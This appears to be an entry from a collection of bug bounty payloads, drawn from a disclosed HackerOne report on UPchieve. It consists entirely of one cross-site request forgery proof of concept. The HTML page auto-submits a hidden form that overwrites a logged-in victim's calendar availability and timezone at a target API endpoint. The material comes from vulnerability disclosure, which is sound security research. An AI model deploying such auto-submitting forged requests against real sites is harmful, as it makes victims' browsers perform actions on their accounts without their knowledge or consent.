# UPchieve

1 payloads.

### `c571b636`

```
<html>
  <body>
    <form action="https://target.com/api/calendar/save" method="POST">
        <input type="hidden" name="availability[Sunday][12a]" value="true" />
        <input type="hidden" name="availability[Sunday][1a]" value="true" />
		
		...
		
        <input type="hidden" name="availability[Saturday][11p]" value="true" />
        <input type="hidden" name="tz" value="Asia/Singapore" />
    </form>
    <script>
      	document.forms[0].submit();
    </script>
  </body>
</html>
```

— [Widespread CSRF on authenticated POST endpoints](https://hackerone.com/reports/1309435) · UPchieve · [zeyu2001](https://hackerone.com/zeyu2001)
